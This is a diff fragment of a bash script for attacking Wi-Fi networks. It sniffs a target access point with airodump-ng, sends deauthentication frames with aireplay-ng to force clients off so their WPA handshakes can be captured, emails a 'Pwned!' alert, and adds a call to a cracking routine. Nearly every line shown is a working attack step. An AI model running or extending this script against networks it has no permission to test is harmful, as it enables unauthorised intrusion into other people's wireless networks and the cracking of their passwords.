@@ -278,13 +278,13 @@ sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write 
 echo -e "[${Green}$foo${White}] Sending DeAuth to target..."
 echo -e "\e[32mAttacking...\e[0m"
 sudo aireplay-ng --deauth 20 -a $bssid $foo > /dev/null 2>&1
-checkServices 
-check_cap_files
-check_eapol_in_cap
+captureMAC
+deauthAttack
 stopMon
 checkServices 
 sleep 3
 echo "Handshakes have been captured." | mail -s "Pwned!" $email
+crack
 }
 
 
